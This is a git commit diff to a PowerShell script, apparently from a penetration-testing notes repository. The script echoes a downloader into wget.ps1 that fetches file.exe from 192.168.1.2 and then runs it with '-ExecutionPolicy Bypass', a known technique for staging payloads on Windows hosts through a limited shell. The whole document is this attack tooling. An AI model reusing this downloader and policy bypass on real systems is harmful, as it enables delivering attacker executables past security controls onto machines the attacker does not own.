b3a6ef60f7886ff1fca7d83e1435d892507dd739
SiowCY <SiowCY@users.noreply.github.com>
2017-05-27 20:43:01 +0800

    Update wget-powershell.ps1

--- wget-powershell.ps1
+++ wget-powershell.ps1
@@ -1,8 +1,8 @@
-$storageDir = $pwd
-$webclient = New-Object System.Net.WebClient
-$url = "http://192.168.1.2/file.exe"
-$file = "file.exe"
-$webclient.DownloadFile($url,$file)
+echo $storageDir = $pwd > wget.ps1
+echo $webclient = New-Object System.Net.WebClient >>wget.ps1
+echo $url = "http://192.168.1.2/file.exe" >>wget.ps1
+echo $file = "file.exe" >>wget.ps1
+echo $webclient.DownloadFile($url,$file) >>wget.ps1
 
 #Bypass execution policy
-powershell.exe -ExecutionPolicy Bypass -NoLogo -NoInteractive -NoProfile -File wget-powershell.ps1
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NoInteractive -NoProfile -File wget.ps1
